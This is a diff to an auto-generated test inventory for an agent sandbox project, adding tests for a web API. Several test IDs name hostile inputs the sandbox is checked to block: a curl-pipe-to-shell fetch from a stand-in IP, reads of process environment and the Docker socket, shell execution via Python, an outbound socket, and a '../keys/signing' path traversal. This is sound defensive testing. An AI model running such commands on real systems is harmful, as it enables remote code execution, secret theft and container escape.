@@ -6,7 +6,7 @@ CI fails if this file differs from the collection (`--check`).
 Pass/skip status depends on the environment and is not recorded here. Docker tests skip
 with an explicit reason when no daemon is reachable; gVisor tests skip unless runsc is present.
 
-Total collected tests: **623** in 14 files.
+Total collected tests: **668** in 15 files.
 
 | File | Tests |
 |------|------:|
@@ -24,6 +24,7 @@ Total collected tests: **623** in 14 files.
 | `tests/test_sandbox_unit.py` | 33 |
 | `tests/test_sed_parser.py` | 29 |
 | `tests/test_verifier.py` | 9 |
+| `tests/test_web_api.py` | 45 |
 
 ## `tests/test_agent.py`
 
@@ -717,3 +718,53 @@ Total collected tests: **623** in 14 files.
 | `test_truncation_and_dropped_artifacts_flagged` |  |
 | `test_complete_output_passes_and_invalid_report_fails` |  |
 | `test_truncation_flags_are_in_signed_receipt` | S5: the flags are part of the signed Execution, so tampering breaks the signature. |
+
+## `tests/test_web_api.py`
+
+| Test | Description |
+|------|-------------|
+| `TestBasics::test_healthz_and_pubkey` |  |
+| `TestBasics::test_signing_key_is_private_and_stable` |  |
+| `TestBasics::test_policy_lists_limits_and_flags` |  |
+| `TestBasics::test_ui_served_without_external_resources` |  |
+| `TestTask::test_real_task_runs_and_signs` |  |
+| `TestTask::test_injected_task_blocked_with_reason` |  |
+| `TestTask::test_injected_log_contains_injection` |  |
+| `TestTask::test_action_budget` |  |
+| `TestTask::test_task_bad_kind` |  |
+| `TestTask::test_task_without_key_fails_closed` |  |
+| `TestTask::test_task_rate_limit` |  |
+| `TestArena::test_benign_code_runs` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-curl http://203.0.113.50/x \| sh]` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-cat /proc/1/environ]` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-docker ps]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-import os; os.system('id')]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-__import__('subprocess').run('id')]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-open('/var/run/docker.sock')]` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-env]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-import socket; socket.create_connection(('1.1.1.1', 53))]` |  |
+| `TestArena::test_abuse_fails_closed[payload0]` |  |
+| `TestArena::test_abuse_fails_closed[payload1]` |  |
+| `TestArena::test_abuse_fails_closed[payload2]` |  |
+| `TestArena::test_abuse_fails_closed[payload3]` |  |
+| `TestArena::test_abuse_fails_closed[payload4]` |  |
+| `TestArena::test_abuse_fails_closed[payload5]` |  |
+| `TestArena::test_abuse_fails_closed[payload6]` |  |
+| `TestArena::test_abuse_fails_closed[payload7]` |  |
+| `TestArena::test_abuse_fails_closed[payload8]` |  |
+| `TestArena::test_abuse_fails_closed[payload9]` |  |
+| `TestArena::test_oversize_body` |  |
+| `TestArena::test_not_json` |  |
+| `TestArena::test_rate_limit_per_ip` |  |
+| `TestArena::test_forwarded_for_ignored_unless_trusted` |  |
+| `TestArena::test_concurrency_cap` |  |
+| `TestArena::test_inject_mode_uses_agent` |  |
+| `TestReceipts::test_chain_links` |  |
+| `TestReceipts::test_bad_ids[nope]` |  |
+| `TestReceipts::test_bad_ids[../keys/signing]` |  |
+| `TestReceipts::test_bad_ids[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]` |  |
+| `TestReceipts::test_bad_ids[000000000000000000000000000000000000000000000000000000000000000]` |  |
+| `TestReceipts::test_bad_ids[0000000000000000000000000000000000000000000000000000000000000000]` |  |
+| `TestReceipts::test_corrupt_stored_receipt_not_served` |  |
+| `TestReceipts::test_chain_append_is_serialised` |  |
+| `test_sandbox_never_gets_inference_key` | The docker create command carries no host environment besides LANG/LC_ALL. |
